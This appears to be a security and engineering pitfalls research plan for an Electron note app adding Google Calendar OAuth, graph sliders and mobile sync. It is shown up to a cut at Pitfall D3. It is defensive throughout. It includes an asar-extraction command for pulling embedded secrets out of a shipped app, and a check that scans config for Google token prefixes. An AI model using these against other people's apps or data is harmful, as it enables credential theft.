# Pitfalls Research — Notal v0.3.1 (Reminders, Graph Control, Mobile)

**Domain:** Electron desktop app extending into OAuth'd cloud service (Google Calendar), interactive D3/force-layout UI parameters, and a networked mobile companion
**Researched:** 2026-04-19
**Confidence:** HIGH for Electron/OAuth/SQLite/Fastify patterns (widely documented, Context7-verifiable); MEDIUM for Notal-specific integration predictions (drawn from stack characteristics)
**Stack baseline:** Electron 28+, React 19 + Vite 6, better-sqlite3 + Drizzle + sqlite-vec, Anthropic/OpenAI/Ollama/node-llama-cpp, Fastify + MCP on 127.0.0.1:7723, NSIS Windows installer, MIT, local-first, no user accounts

---

## Category A — Google Calendar Integration

### Pitfall A1: Shipping a Google OAuth client_secret inside the Electron bundle

**Severity:** CRITICAL (trust + policy)
**Phase:** Calendar (OAuth setup task, earliest)

**What happens:**
A developer registers a "Web application" OAuth client in Google Cloud Console, puts client_id and client_secret into `src/main/calendar/auth.ts`, builds the NSIS installer, ships it. Anyone who `asar extract`s the `.asar` (trivial — `npx asar extract app.asar out/`) has the secret. Google's policy for installed apps explicitly says the secret is not truly secret for distributed desktop apps, but shipping a *Web* client secret (vs an *Installed Application / Desktop* client, which uses PKCE) is an actual policy violation that can get the OAuth client suspended, breaking Calendar for every Notal user simultaneously.

**Why it hits Notal specifically:**
Notal is MIT-licensed and open source on GitHub — the secret would be in the repo history forever after the first push, not just in binary. Rotating it requires every existing installer to break. The "open source is the primary trust mechanism" principle from PROJECT.md is incompatible with a hidden secret model anyway.

**Prevention:**
- Register OAuth client as **"Desktop app"** type in Google Cloud Console (not "Web")
- Use **PKCE (Proof Key for Code Exchange, RFC 7636)** — no client_secret needed
- Redirect via **loopback IP address** (`http://127.0.0.1:<random_port>/oauth/callback`) per Google's current installed-app recommendation
- Verification test: `asar extract` the shipped bundle and grep for "client_secret" — must return zero hits
- Separate dev-mode OAuth client from shipped OAuth client so a dev credential leak doesn't compromise production

---

### Pitfall A2: Custom-protocol redirect (notal://oauth) hijackable by other apps

**Severity:** CRITICAL (account takeover vector)
**Phase:** Calendar

**What happens:**
Developer chooses `notal://oauth/callback` as the redirect URI because it "looks cleaner" than a loopback URL. On Windows, any other app can register the `notal://` protocol (last writer wins, no enforcement). A malicious app registers `notal://`, user authorizes Google Calendar, auth code is delivered to the attacker's app, attacker exchanges it for tokens, attacker has ongoing read/write access to victim's calendar.

**Why it hits Notal specifically:**
Notal's NSIS installer already registers at least one custom scheme candidate for mobile-pairing (see Mobile section). Developers reaching for the same mechanism for OAuth is a predictable mistake. Windows has no per-user protocol locking — Electron's `app.setAsDefaultProtocolClient` is first-come-first-served at system level.

**Prevention:**
- **Loopback redirect only**: ephemeral HTTP server on `127.0.0.1:<random_port>` bound *just* for the auth round-trip, shut down immediately after
- Port is chosen at runtime (not hardcoded) via `server.listen(0)` then read `server.address().port`
- Redirect URI registered with Google as `http://127.0.0.1` with wildcard port (Google explicitly supports this for installed apps)
- Verification: automated test that the loopback listener binds only `127.0.0.1` (never `0.0.0.0`) and the port is non-deterministic across runs

---

### Pitfall A3: Refresh token in plaintext `electron-conf` / config JSON

**Severity:** CRITICAL (persistent account compromise)
**Phase:** Calendar

**What happens:**
`electron-conf` or similar writes settings to `%APPDATA%/Notal/config.json`. Developer stores `google_refresh_token` there. Any process on the machine running as the user (browser extension malware, unrelated dev tool, leaked backup in OneDrive sync) can read it. Refresh tokens are long-lived (Google: up to 6 months of inactivity, effectively indefinite with regular use). One leaked config = permanent calendar access for attacker until user manually revokes via myaccount.google.com.

**Why it hits Notal specifically:**
The local-first ethos means *all* state lives on disk — it's tempting to put tokens in the same SQLite/config the rest of the app uses. Notal has no server to rotate secrets from.

**Prevention:**
- Store tokens via **OS keychain**: Windows Credential Manager (via `keytar` or Electron's `safeStorage`), macOS Keychain on mac build
- **Prefer `Electron.safeStorage`** over `keytar` — built-in, no native build step, encryption keyed to the user's OS login on Windows (DPAPI)
- Never log the raw refresh token (grep the codebase for logger calls that include the token object)
- Add a requirement: "Calendar tokens MUST be stored only via `safeStorage.encryptString()` and decrypted at use time; SQLite/config.json MUST NOT contain token material"
- Verification: dev-mode boot sequence that dumps config.json and asserts no `ya29.` or `1//` prefixed strings (Google token prefixes)

---

### Pitfall A4: AI-driven event creation without user confirmation → trust collapse

**Severity:** CRITICAL (product-killing)
**Phase:** Calendar

**What happens:**
User writes "remind me to breathe lol" as a joke, or "note to self: I need to remember to stop saying 'literally'", or "remember to file the divorce papers" while venting. Phrase detector (LLM or regex) fires, creates a calendar event unilaterally. User gets a push notification on their phone. Three outcomes: (1) confusion ("why is this on my calendar?"), (2) embarrassment if the event title is sensitive and shared calendar views expose it, (3) the user no longer trusts the app and uninstalls — the quiet-AI principle is shattered.

**Why it hits Notal specifically:**
The entire Notal design principle #1 is "Quiet: The AI never interrupts". Silent event creation is the loudest possible AI action — it reaches the user's phone, watch, family-shared calendar. This contradicts the product's core value more than any other feature could.

**Prevention:**
- **Two-stage flow mandatory**: (1) AI *proposes* a reminder shown inline in the note card (non-blocking, does not interrupt writing); (2) user clicks "Add to Calendar" — one-tap confirm before any network call to Google
- The proposed reminder is dismissable with Esc; dismissal is remembered so re-processing doesn't re-propose
- Add a **global kill switch** in settings: "Calendar suggestions" — off by default until the user opts in during a guided first-run
- Confidence threshold from the detector must exceed a floor (e.g., 0.85) or the suggestion isn't shown; low-confidence matches are logged for offline tuning, not surfaced
- Requirement: "No Google Calendar API write call MAY occur without an explicit user click within the preceding 5 seconds"

---

### Pitfall A5: Timezone drift between AI parse, SQLite, and Google API

**Severity:** HIGH (every event slightly wrong erodes trust)
**Phase:** Calendar

**What happens:**
User in PST writes "remind me tomorrow at 3". AI sees UTC wall clock (Electron main process might default to UTC in some build environments, especially CI-built binaries). It parses "tomorrow at 3" as 15:00 UTC, writes `2026-04-20T15:00:00Z` to SQLite. Google Calendar creates the event at 15:00 UTC = 08:00 PST. User shows up to a meeting at 3pm local, event was at 8am, user is seven hours late. Or: daylight-saving transition falls between parse-time and event-time, event drifts by 1 hour.

**Why it hits Notal specifically:**
SQLite stores timestamps without a canonical timezone convention; better-sqlite3 returns strings. Mixed with AI-parsed natural language, the surface area for timezone bugs is unusually wide. Notal targets Windows (user TZ from registry) and macOS (user TZ from system prefs) — different retrieval paths in Node.

**Prevention:**
- **Single canonical storage format**: store reminders as `{timestamp_utc: ISO8601 with Z, original_tz: IANA zone, original_text: "tomorrow at 3"}` — all three fields, always
- Use **`Intl.DateTimeFormat().resolvedOptions().timeZone`** as the source of truth for user TZ (not `process.env.TZ`, not OS calls)
- Pass IANA TZ to Google via the `start.timeZone` field (Google accepts both dateTime with offset *and* an explicit timeZone — use both)
- Test matrix: mock system TZ as {UTC, America/Los_Angeles, Asia/Kolkata (half-hour offset), Pacific/Chatham (45-min offset)}, parse "tomorrow at 3pm", assert the Google API payload has the correct ISO8601 with matching IANA timeZone
- DST crossover test: schedule "next Sunday at 2:30am" during a US spring-forward week

---

### Pitfall A6: LLM-on-every-note phrase detection → runaway API bill

**Severity:** HIGH
**Phase:** Calendar

**What happens:**
Developer implements phrase detection as "send the note to Claude/GPT with a prompt: does this contain a reminder?". Every single note — including one-word notes, TODO lists, meeting transcripts pasted in — triggers one LLM call. User pastes a 40KB meeting transcript: $0.40 of input tokens for detection alone before any other pipeline step. Power user writing 100 notes a day: $40/day just on reminder detection. API bill quadruples silently.

**Why it hits Notal specifically:**
Notal already has a silent pipeline per note (organize → integrate → comment). Each note is already expensive. Stacking reminder-detection on top multiplies the cost, and the user doesn't see the cost because their key is used directly.

**Prevention:**
- **Cheap pre-filter first**: regex / compiled pattern list — `/\b(remind me|don't forget|need to remember|remember to|todo.*\bby\b)\b/i` — plus a time/date token detector (chrono-node). If neither fires, no LLM call.
- **Only escalate to LLM** when both pre-filters match AND the note has a plausible date/time token
- Budget cap: surface in settings "Calendar suggestions use up to ~$X/month at your current writing volume" (estimated from last 30 days), with a hard monthly cap the user can set
- Detection runs on the **same LLM that's already processing the note** (piggyback on the existing organize/integrate call via a structured output field `reminder_candidate`) — no separate round-trip
- Verification test: seed a corpus of 50 notes, 5 of which have reminders; assert ≤6 LLM calls were made (5 true-positive + ≤1 false-positive)

---

### Pitfall A7: Note deletion does not cascade to the reminder

**Severity:** HIGH
**Phase:** Calendar

**What happens:**
User creates note "plan dinner Friday 7pm", AI creates calendar event. User deletes the note (ephemeral thought, changed plans). Event remains on Google Calendar. Friday at 6:45pm phone buzzes for a meeting the user explicitly retracted. Worse: user deletes *all* notes during a corkboard cleanup; calendar fills with orphaned events the user no longer has any record of in Notal.

**Why it hits Notal specifically:**
The mental model of Notal is "write and forget" — notes are low-ceremony. Users *will* delete notes. The calendar side-effect creates persistent state the user doesn't think of as theirs.

**Prevention:**
- SQLite `reminders` table has FK to `notes(id)` with `ON DELETE CASCADE` at the Drizzle level — *and* a trigger that enqueues a "delete Google event" job
- On note deletion: show a **single-sentence confirmation** "Delete note — also remove 1 linked calendar event?" with default Yes, checkbox "don't ask again"
- Orphan reconciliation job on startup: scan calendar events with `extendedProperties.private.notal_note_id`, verify each note exists; if not, mark event for user-review (don't auto-delete after the note is gone — may have been deleted in error)
- Store the calendar `eventId` and `calendarId` alongside the note so deletion can actually find the event to remove

---

### Pitfall A8: Silent auth expiry — user thinks Notal broke itself

**Severity:** HIGH (retention killer)
**Phase:** Calendar

**What happens:**
Refresh token expires (user revoked access from myaccount.google.com, or 6-month inactivity, or Google rotated policies). Next reminder creation silently 401s. Notal's quiet-by-design philosophy means no error popup — the user writes "remind me to pick up groceries at 5", sees the note card, no calendar event appears, user assumes the feature is working. Misses groceries.

**Why it hits Notal specifically:**
"Quiet" is weaponized against the user here. The principle that the AI never interrupts must not extend to silent failure of features the user explicitly enabled.

**Prevention:**
- **Health indicator in the settings panel**: green/yellow/red dot for Calendar connection with "Last successful event created: 2 hours ago" / "Auth expired — reconnect"
- **In-note inline badge**: when a reminder *was detected* but *could not be created*, the note card shows a subtle "⚠ reminder pending — reconnect calendar" chip (does not block writing, but visible in the corkboard view)
- Background refresh-token renewal runs once per day; failure triggers the red health dot, not a modal
- Distinguish **"quiet AI suggestions"** (allowed to be invisible) from **"user-confirmed actions that failed"** (must be visible) — they are different classes of silence

---

## Category B — Dynamic Wiki Graph Parameters

### Pitfall B1: Slider drag triggers force-simulation restart every tick → app freezes

**Severity:** CRITICAL (renders feature unusable at target scale)
**Phase:** Graph

**What happens:**
Slider `onChange` is bound directly to `simulation.force('link').strength(value)` plus `simulation.alpha(1).restart()`. React re-renders the slider at 60Hz during drag. Each restart re-heats the simulation to α=1, runs ~300 ticks over the next second, overlapping with the next drag event. On a wiki with 500+ nodes (a realistic 3-month Notal user), this saturates the main renderer thread; drag becomes jerky, the Electron window shows "Not Responding" on Windows.

**Why it hits Notal specifically:**
Notal's wiki is *generated* by an AI — it grows faster than manually-curated graphs. A user six weeks in can easily have 400 nodes / 1000 edges. The v0.3.0 corkboard already taxes rendering; stacking an interactive force sim on the same renderer process is going to bite.

**Prevention:**
- **Separate the slider value from the simulation parameter** with a throttle: slider updates local React state every frame (for visual thumb position), but `simulation.force(...).strength(value)` only applies at the trailing edge of a 50ms window via `requestAnimationFrame` + `lodash.throttle`
- Do **not** call `simulation.alpha(1).restart()` on parameter change — use `simulation.alpha(0.3).restart()` (gentle re-heat) or better, `simulation.alphaTarget(0.1)` during drag, `alphaTarget(0)` on release
- Benchmark gate: automated test with a 500-node graph drags a slider across its range; p95 frame time during the drag must stay under 50ms
- Consider **web worker** for the simulation (d3-force runs fine in a worker) so renderer thread stays free for the slider itself
- If worker is deferred, at minimum cap the simulation at `simulation.stop()` after N seconds of no parameter change, resuming on next interaction

---

### Pitfall B2: Persistent slider values survive schema changes → unusable default layout for growing graphs

**Severity:** HIGH
**Phase:** Graph

**What happens:**
User tunes sliders on a 20-node wiki at week 2 to get a nice spread. Values persist in SQLite settings. At month 6, wiki is 400 nodes — the same repel force that looked good at 20 nodes now explodes the graph off-screen, or collapses it into a black dot. User thinks Notal's graph feature is broken; there's no "reset" button obvious.

**Why it hits Notal specifically:**
Graphs that grow monotonically with AI-generated structure cross scale boundaries invisibly. Users won't think "maybe my sliders are stale" — they'll think "this app stopped working".

**Prevention:**
- **Always-visible "Reset to Defaults"** button in the graph controls panel (not buried in a settings menu)
- **Adaptive defaults**: default slider values are a *function of node count*, not constants. E.g., repel ∝ -30 * sqrt(n), link distance ∝ 30 + log(n). User's override is stored as a *multiplier on the adaptive default*, not an absolute, so "1.0x repel" keeps meaning the same thing as n grows.
- **Re-center heuristic**: every N seconds of idle, if the graph bounding box extends beyond the viewport by more than 2x, softly zoom-to-fit (don't fight the user mid-interaction)
- Store slider values with a `schema_version` tag; on graph engine version bumps, either migrate or reset to defaults with a toast "Graph settings reset for new version"

---

### Pitfall B3: "I broke my graph" recovery is hidden → support burden / churn

**Severity:** MEDIUM
**Phase:** Graph

**What happens:**
User experiments with sliders, drags everything to extremes to see what happens, gets a graph that's a single dot or pure chaos. Can't find the reset. Closes the graph panel, reopens — settings persisted, still broken. Searches GitHub issues, doesn't find anything. Uninstalls.

**Why it hits Notal specifically:**
Notal has no support team and no in-app help system. A power feature with no escape hatch is a trap door.

**Prevention:**
- "Reset to Defaults" keyboard shortcut (e.g., double-click the slider thumb to reset that slider; Ctrl+R within the graph panel to reset all)
- **Undo stack for slider changes**: last 10 slider values recorded, Ctrl+Z within the graph panel reverts the most recent slider tweak
- First-time UX: the first time a user touches a slider, a one-time tooltip "Ctrl+R resets all graph controls" appears
- Verification test: manual UAT script "set every slider to its extreme max, then recover the default layout in under 10 seconds without the web"

---

### Pitfall B4: Sliders without keyboard/ARIA — fails accessibility and fails power users

**Severity:** MEDIUM
**Phase:** Graph

**What happens:**
Developer uses a custom `<div>`-based slider (or a Tailwind-styled native `<input type="range">` without ARIA attributes). Screen readers announce "slider" with no value or range. Keyboard users can't tab to it. Power users who want a precise value can't type one.

**Why it hits Notal specifically:**
Notal's audience includes developers and knowledge workers — a demographic with higher-than-average accessibility awareness and a higher-than-average share of keyboard-primary users. Visible a11y failures get posted to Hacker News.

**Prevention:**
- Use `<input type="range">` with `aria-label`, `aria-valuemin`, `aria-valuemax`, `aria-valuenow`, and a `<label>` association
- Paired numeric `<input type="number">` next to each slider for direct entry
- Keyboard: arrow keys adjust by step, Shift+Arrow by 10x step, Home/End to min/max
- Automated a11y test: axe-core run on the graph panel asserts zero violations

---

### Pitfall B5: Scope creep — "dynamic graph parameters" becomes "dynamic graph EVERYTHING"

**Severity:** MEDIUM (schedule risk)
**Phase:** Graph (scoping discipline)

**What happens:**
Once the slider panel exists, every graph-adjacent feature becomes a "just add another slider" request: node size, node color, edge thickness, label font, filter by tag, filter by date, cluster coloring, edge color by tag, hide orphans, pin roots. Each one is "easy". Milestone v0.3.1 ships in July instead of May, and the sliders are still half-documented.

**Why it hits Notal specifically:**
Notal's solo-developer context means every "just one more" has no backstop. The milestone explicitly lists three themes — mobile is the hardest — so graph over-scope steals time from mobile.

**Prevention:**
- **Freeze the slider list now**: link force, center force, repel force, edge thickness, node size. Exactly five. Documented in REQUIREMENTS.md as the complete v0.3.1 graph-controls scope.
- Any additional slider requests go to a `v0.4.x-graph-controls-backlog.md` file, not into v0.3.1
- Phase gate: the Graph phase cannot exit with more than five sliders shipped

---

### Pitfall B6: Hard-coded graph component forces a refactor before sliders can be added

**Severity:** MEDIUM (hidden cost, not a bug per se)
**Phase:** Graph (preliminary refactor task)

**What happens:**
The current wiki graph component was written with force parameters inline: `forceManyBody().strength(-30)`. Adding a slider requires threading the prop through the component tree, but the component is a big blob and the forces are constructed in three different places. Developer starts adding sliders, realizes refactor is needed, milestone plan didn't budget for it, scope slips.

**Why it hits Notal specifically:**
v0.3.0 shipped the wiki graph as a freshly-introduced feature; it was written to work, not to be parameterizable. Going from "works" to "configurable" is a structural change.

**Prevention:**
- **First task in the Graph phase is an explicit refactor**: extract all force parameters into a single `GraphConfig` object, thread it through as a prop, no slider logic yet — just prove the forces can be driven from external state
- Refactor PR must be merged and shipped (behind a feature flag if needed) **before** any slider UI is written
- Verification: the refactor PR contains zero visual change (pixel-diff test passes), only structural

---

## Category C — Mobile Extension

### Pitfall C1: Binding Fastify to 0.0.0.0 to reach mobile — exposes MCP to the LAN

**Severity:** CRITICAL (remote code execution on the knowledge base)
**Phase:** Mobile (Foundation)

**What happens:**
Developer changes the Fastify server from `listen(7723, '127.0.0.1')` to `listen(7723, '0.0.0.0')` so the phone can connect. Now every device on the LAN — smart TV, compromised IoT camera, a guest's laptop, a malicious app on a housemate's phone — can hit the MCP endpoint. The existing Bearer token is a single static onboarding token; anyone who can sniff one HTTP request, or who knows the default, reads/writes the entire knowledge base.

**Why it hits Notal specifically:**
The MCP server's current threat model was "only the logged-in user on this machine" (because `127.0.0.1`). Widening the bind address without changing the auth model silently promotes localhost-only threats to LAN-wide threats. Notal's KB contains *all* the user's notes — far more sensitive than most LAN-exposed services.

**Prevention:**
- **Do not widen the bind** — keep Fastify on `127.0.0.1`. Expose mobile access via a **separate, purpose-built endpoint** (see C2 for pairing, C5 for transport) with its own authentication, its own rate limits, and a distinct allowlist.
- Or: bind to `0.0.0.0` but require mutual-TLS with a device-specific certificate issued during pairing. No cert = connection refused at TLS layer, before any HTTP/Fastify logic runs.
- **Network ACL test** in CI: start Notal in mobile-enabled mode, attempt to hit `/api/notes` from a second machine with no paired cert — must get a connection-level refusal, not a 401
- Default: mobile extension **off**. User must explicitly enable in settings, with a clear dialog: "This allows your phone to connect to this computer over your home network. Only enable on networks you trust."

---

### Pitfall C2: Reusing the onboarding Bearer token for mobile = unrotatable master key

**Severity:** CRITICAL
**Phase:** Mobile (Foundation)

**What happens:**
Developer says "we already have a Bearer token for MCP; mobile will just use the same one". User pairs mobile by manually copying the token. Later, user loses the phone. Token cannot be rotated without breaking every MCP-connected agent. User either continues to have a lost device with full KB access, or resets everything.

**Why it hits Notal specifically:**
The existing Bearer model was designed for localhost where "leaking the token" meant the attacker was already on the machine. Pushing it off-box changes the risk profile entirely.

**Prevention:**
- **Per-device tokens**: each paired mobile gets its own token, recorded in SQLite `paired_devices` table with fields `{device_id, device_name, token_hash (bcrypt/argon2), created_at, last_seen_at, scopes}`
- **Revocation UI**: settings panel "Paired Devices" shows each device with a "Revoke" button — one-click kills that device's token without affecting others
- Tokens have **scopes**: mobile gets `notes:create` only by default (capture-only), not `notes:read` / `kb:read` unless user opts in
- Pairing flow uses **short-lived pairing code + QR code** (see C4), not manual token copy
- Requirement: "No two paired devices may share a token; `SELECT COUNT(*) FROM paired_devices GROUP BY token_hash HAVING COUNT(*) > 1` must return zero rows"

---

### Pitfall C3: better-sqlite3 WAL + HTTP writer ≠ broken, but naive patterns are

**Severity:** HIGH
**Phase:** Mobile (Data layer)

**What happens:**
Developer assumes mobile writes must go through a different database because better-sqlite3 is "holding WAL". They spin up a secondary SQLite file for mobile inbox, then have a reconciler. Reconciler has bugs. Notes lost or duplicated.

OR the inverse mistake: mobile writes via a naive HTTP handler that opens its own `new Database(path)` handle in the Fastify process, bypassing the main-process singleton. Now two handles contend for WAL; fine for reads, but any transaction that straddles the two handles sees torn state. Occasional "database is locked" errors.

**Why it hits Notal specifically:**
better-sqlite3 is synchronous and single-threaded per handle. Electron's main process already owns a handle. Fastify runs in the main process (127.0.0.1:7723 today), so it shares the handle via dependency injection — fine. But a mobile-motivated refactor that splits Fastify into a worker, or adds a second process, can break this without obvious symptoms.

**Prevention:**
- **One SQLite handle, period**: the main-process `db` singleton is the only writer. Mobile HTTP handlers are defined in the main process and call the same Drizzle functions as the local UI. No second handle.
- If mobile logic must live in a worker thread, use better-sqlite3's `db.serialize()` pattern via message-passing, not a second file handle
- WAL is already enabled; verify with `PRAGMA journal_mode` at boot, assert `wal`
- Load test: 10 mobile clients POST notes concurrently for 60 seconds while the desktop UI also writes; assert zero `SQLITE_BUSY` errors and zero duplicate/lost notes

---

### Pitfall C4: Pairing flow that's either insecure (QR with static token) or unusable (typing a long code)

**Severity:** HIGH
**Phase:** Mobile (Onboarding)

**What happens:**
Version A: QR code embeds the static Bearer token. Anyone who photographs the user's screen over their shoulder has persistent access. Version B: User has to type a 32-character pairing code on a phone keyboard, fails three times, gives up on mobile.

**Why it hits Notal specifically:**
Notal has no user accounts, so the pairing act *is* the identity — it must be both secure and non-awful.

**Prevention:**
- **Short-lived pairing code** (6 digits, 90 second TTL, displayed on desktop) AND **QR code** encoding a one-time handshake URL (`https://127.0.0.1:PORT/pair?nonce=<random>`). Both forms of the same pairing session; either works.
- On mobile: scan QR (or type the 6-digit code). Mobile generates a key pair, sends its public key during pairing, receives a device-specific long-lived token encrypted to that public key.
- After pairing, the 6-digit code is invalidated immediately; subsequent scans fail.
- Pairing session must occur over HTTPS (self-signed cert accepted for localhost, pinned by the mobile app on first pair — see C5)
- Threat model test: with the 6-digit code written on a sticky note, an attacker 2 minutes later cannot pair (TTL expired); with the code fresh, only one pairing succeeds (first consumer wins, then invalidated)

---

### Pitfall C5: Plaintext HTTP on LAN → credentials sniffable, notes sniffable

**Severity:** HIGH
**Phase:** Mobile (Transport)

**What happens:**
Mobile connects to the desktop's Fastify server over `http://192.168.1.20:7723`. Any device on the LAN with a packet sniffer (or an ARP-spoofing attacker) sees every note in the clear. The Bearer token is sent on every request — easy to replay.

**Why it hits Notal specifically:**
LAN is not a trust boundary on home networks with IoT devices, guest Wi-Fi, or roommates. Notes are sensitive personal content.

**Prevention:**
- **TLS mandatory** even on LAN. Generate a self-signed cert at install time, pin it during pairing (mobile stores cert fingerprint, rejects mismatch)
- Use a library like `mkcert` pattern: the desktop generates a per-install CA and issues a server cert for `127.0.0.1` and the machine's LAN IP(s); mobile pins the CA cert's fingerprint from the pairing QR
- No HTTP fallback. If TLS handshake fails, the mobile app shows a pairing error, doesn't silently downgrade.
- Bearer tokens travel in `Authorization:` header only, never in URLs or query strings (avoids leaking into logs / browser history)

---

### Pitfall C6: Desktop closed → mobile notes stuck in limbo → user thinks the note was lost

**Severity:** HIGH
**Phase:** Mobile (Sync model)

**What happens:**
User captures a note on the train via mobile. Desktop is at home, asleep/closed. Note sits on the phone in "outbox", or worse — the mobile app says "sent" but desktop never received. User arrives home, opens Notal, no new note. User can't remember what they typed. Classic data loss scenario.

**Why it hits Notal specifically:**
The AI pipeline runs on the desktop. There's no always-on server. "Silent AI processing" assumed the desktop was on. Mobile reverses that assumption.

**Prevention:**
- **Mobile always has its own persistent outbox** (SQLite on iOS/Android, or IndexedDB on PWA). Notes are durable on the phone before any sync attempt.
- **Explicit delivery state** shown in the mobile UI: `local` → `syncing` → `delivered (queued for AI)` → `processed`. User always sees where their note is.
- Desktop, on wake/launch, pulls any pending notes from each paired mobile (mobile pushes on connect; desktop advertises via mDNS if on same LAN)
- **Grace period banner** on desktop wake: "5 notes captured on mobile in the last 18 hours — processing now"
- User-facing expectation-setting copy at first mobile pair: "Notes captured on mobile are queued until your desktop is open. AI processing happens on the desktop."

---

### Pitfall C7: PWA on iOS — Safari's silent storage eviction + no reliable background

**Severity:** HIGH (if PWA is chosen)
**Phase:** Mobile (Platform decision)

**What happens:**
Developer ships a PWA to avoid App Store review. iOS Safari has a 7-day rule: PWA local storage (including IndexedDB) can be evicted after 7 days without an app launch. User captures 10 notes on a trip, doesn't open Notal PWA for 8 days, opens it — outbox empty. Notes gone. Also: iOS PWA has no reliable background sync; notes only send when the app is foreground.

**Why it hits Notal specifically:**
PWA is attractive for a solo dev — no App Store review, no Apple Developer Program fee, no review compliance burden. But the storage eviction model contradicts Notal's local-first durability promise.

**Prevention:**
- **Decide platform strategy in Phase 1 of Mobile before building UI**. Options, ranked:
  1. Native iOS + native Android (most reliable, heaviest build) — Capacitor wrapping the React app is a reasonable middle ground
  2. PWA with explicit "add to home screen" + in-app warning on iOS: "Notes captured offline will sync when you next reconnect; please open the app at least weekly to prevent iOS from clearing cached notes"
  3. Capture-only web form (no offline) — simplest, no data loss, but no offline use
- If PWA: use the **Periodic Background Sync API** on Android (works), accept the iOS limitation and document it, add a **server-push** acknowledgment so the mobile app can drop local copies of confirmed-synced notes (reduces eviction surface)
- Test plan: iOS 17+ Safari, PWA installed, capture 5 notes offline, wait 7 days without opening, reopen — document actual behavior and update UX copy to match

---

### Pitfall C8: App Store privacy labels must match "local-first" claim or the app gets rejected

**Severity:** HIGH (blocks ship for native path)
**Phase:** Mobile (Store submission, only if native)

**What happens:**
Developer submits Notal Mobile to App Store. Apple's privacy nutrition label requires declaring what data is collected. Developer says "no data collected" to match the local-first story. But the app *does* send notes to the user's desktop (over LAN), and *could* be construed as collecting data if the LLM API call happens mobile-side. Reviewer flags mismatch. Rejected.

**Why it hits Notal specifically:**
Notal's messaging ("no cloud backend required", "local-first") is a marketing feature that has to survive App Store review literally.

**Prevention:**
- Privacy label states: **"Data Not Linked to You"** category including (a) Notes sent to user-owned desktop over user's own network (user data, not collected by developer), and (b) if the mobile app makes LLM calls directly with the user's API key: "User Content sent to [Anthropic/OpenAI] per user's configured API key — developer does not receive this data"
- **Do not send LLM calls from mobile** in v0.3.1 — let mobile be capture-only, desktop does AI. This drastically simplifies privacy labels (no third-party data transmission from the mobile app itself).
- Prepare a short reviewer note for App Store submission explaining the local-first architecture and referencing the open-source repo

---

### Pitfall C9: Mobile-desktop protocol version skew → silent incompatibility

**Severity:** MEDIUM
**Phase:** Mobile (Protocol)

**What happens:**
Desktop is on v0.3.1, mobile is on v0.3.2 (faster release cadence via PWA). New endpoint `/api/notes/v2` on mobile side, desktop doesn't understand it, silently 404s. Or inverse: desktop on v0.4.0 expects new auth handshake; mobile still v0.3.1 can't negotiate; user's mobile stops working with no obvious error.

**Why it hits Notal specifically:**
Desktop and mobile update on different channels — desktop via NSIS installer (user has to run it), mobile via app store or PWA auto-refresh. Skew is not just possible; it's the common case.

**Prevention:**
- **Version handshake on connect**: mobile sends `X-Notal-Mobile-Version: 0.3.2`; desktop responds with `X-Notal-Desktop-Version: 0.3.1` and a list of supported protocol versions `X-Notal-Protocol: 1,2`
- Both sides negotiate to the highest common protocol version. If no overlap, show a clear message on mobile: "Your desktop is on v0.3.1; update it to use this version of Notal Mobile."
- Maintain a **compatibility matrix** doc in the repo, updated with every release
- Breaking changes only at minor-version boundaries (v0.3.x ↔ v0.3.y must always work; v0.3 ↔ v0.4 may require simultaneous update)
- Integration test: spin up old-desktop + new-mobile and new-desktop + old-mobile; one scenario degrades gracefully, the other shows the clear error

---

### Pitfall C10: Lost phone / stolen phone → permanent KB read access by whoever holds the device

**Severity:** HIGH
**Phase:** Mobile (Threat model)

**What happens:**
User's phone is stolen with Notal paired. Attacker has the mobile app, which has the paired device token stored in the phone's keychain. Phone is on attacker's home network — no Notal access (not on user's LAN). But if the attacker is on the user's LAN (household theft, office), or if Notal mobile's storage also holds cached KB pages, attacker reads notes.

**Why it hits Notal specifically:**
Notal has no user accounts — there's no "log into notal.com and revoke sessions". Revocation has to happen on the desktop, which the user may not be near.

**Prevention:**
- **Biometric gate on mobile app launch** (Face ID / Touch ID / Android biometric). OS-level keychain unlock only after biometric.
- Token storage uses iOS Keychain `kSecAttrAccessibleWhenUnlockedThisDeviceOnly` / Android Keystore with user authentication required
- **Remote revocation** without desktop: a "revoke my mobile" link the user can hit via a one-time recovery code printed during pairing. Pointed at the desktop's MCP server *when the desktop is reachable* — or: the desktop refuses any mobile device last-seen >30 days ago without re-pairing.
- Cached KB pages on mobile (if enabled) are encrypted at rest with a key derived from the device token; revoking the token makes cached data unreadable
- Settings UI: "Paired devices" shows "last seen" timestamp and "Revoke" button (first line of defense)

---

## Category D — Cross-Cutting

### Pitfall D1: Shipping all three themes half-done

**Severity:** HIGH (milestone credibility)
**Phase:** Cross-cutting (scoping, milestone planning)

**What happens:**
Calendar 70% done (OAuth works, phrase detection flaky), graph 70% done (sliders work, no reset button), mobile 70% done (PWA captures, sync unreliable). Milestone ships because "all three features exist". Users hit all three rough edges in the first week. Notal gets a reputation for being buggy.

**Why it hits Notal specifically:**
The milestone name — "Reminders, Graph Control, Mobile" — implies parity between the three themes. But they are not equally hard: mobile is an order of magnitude more work than sliders. Planning them as equals is a trap.

**Prevention:**
- **Designate one MVP-critical theme per milestone**; v0.3.1's is **Calendar** (recommended — it's the most self-contained, and every user will use it immediately). Graph is a polish feature. Mobile is risky and benefits from being split into v0.3.2+.
- Explicitly label in the roadmap: "If schedule slips, mobile drops to v0.3.2; graph drops to v0.3.1.1 (patch); calendar must ship."
- Phase gates with binary accept/reject: no "80% done" exits. Each theme either fully passes its UAT or is cut.
- Calendar's UAT is the ship gate for v0.3.1. Graph and mobile each have their own UAT but failing them delays only their own release.

---

### Pitfall D2: Three themes need three different infrastructure skills simultaneously

**Severity:** MEDIUM (solo-dev cognitive load)
**Phase:** Cross-cutting (phase ordering)

**What happens:**
Week 1: OAuth + token storage (security mindset). Week 2: D3 force simulation + throttling (animation/perf mindset). Week 3: mDNS + TLS + mobile build toolchain (networking + mobile mindset). Context-switching between these is expensive; quality on each suffers.

**Why it hits Notal specifically:**
Solo dev. No handoffs, no specialization. Every context switch costs a day of ramp-up.

**Prevention:**
- **Sequence phases serially, not interleaved**: finish Calendar end-to-end (including UAT) before starting Graph. Finish Graph before starting Mobile.
- Each theme gets its own research cache (small lived doc in `.planning/research/calendar-notes.md` etc.) so when returning to OAuth decisions after a graph detour, context rebuilds fast
- Resist the urge to "do a little of each in parallel"

---

### Pitfall D3: New preload APIs violate contextIsolation / nodeIntegration discipline

**Severity:** CRITICAL (security regression)
**Phase:** Cross-cutting (every phase that adds IPC)

**What happens:**
